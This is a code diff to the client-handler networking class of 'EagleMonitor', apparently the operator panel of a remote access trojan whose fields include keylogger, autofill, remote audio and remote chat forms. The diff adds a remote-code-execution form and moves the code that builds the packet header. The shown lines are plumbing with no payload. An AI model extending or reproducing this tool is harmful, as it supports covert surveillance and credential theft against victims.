@@ -71,6 +71,7 @@ namespace EagleMonitor.Networking
         internal KeywordsForm keywordsForm { get; set; }
         internal RemoteAudioForm remoteAudioForm { get; set; }
         internal RemoteChatForm chatForm { get; set; }
+        internal RemoteCodeForm remoteCodeForm { get; set; }
         internal ClientHandler(Socket sock, int port) 
         {
             readDataAsync = new ReadDataAsync(ReceiveData);
@@ -134,7 +135,6 @@ namespace EagleMonitor.Networking
             {
                 byte[] data = readDataAsync.EndInvoke(ar);
 
-
                 if (data != null)//&& Connected)
                     readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
 
@@ -163,7 +163,6 @@ namespace EagleMonitor.Networking
         {
             try
             {
-
                 IPacket packet = readPacketAsync.EndInvoke(ar);
 
                 if (packet != null)
@@ -232,22 +231,23 @@ namespace EagleMonitor.Networking
             try
             {
                 byte[] encryptedData = data.SerializePacket(Utils.Miscellaneous.settings.key);
+
+                int total = 0;
+                int size = encryptedData.Length;
+                int datalft = size;
+                byte[] header = new byte[5];
+                socket.Poll(-1, SelectMode.SelectWrite);
+
+                byte[] temp = BitConverter.GetBytes(size);
+
+                header[0] = temp[0];
+                header[1] = temp[1];
+                header[2] = temp[2];
+                header[3] = temp[3];
+                header[4] = (byte)data.packetType;
+
                 lock (socket)
                 {
-                    int total = 0;
-                    int size = encryptedData.Length;
-                    int datalft = size;
-                    byte[] header = new byte[5];
-                    socket.Poll(-1, SelectMode.SelectWrite);
-
-                    byte[] temp = BitConverter.GetBytes(size);
-
-                    header[0] = temp[0];
-                    header[1] = temp[1];
-                    header[2] = temp[2];
-                    header[3] = temp[3];
-                    header[4] = (byte)data.packetType;
-
                     int sent = socket.Send(header);
 
                     if (size > 1000000)
@@ -376,6 +376,7 @@ namespace EagleMonitor.Networking
                 Utils.Miscellaneous.CloseForm(chatForm);
                 Utils.Miscellaneous.CloseForm(autofillForm);
                 Utils.Miscellaneous.CloseForm(keyloggerForm);
+                Utils.Miscellaneous.CloseForm(remoteCodeForm);
             }
         }
     }
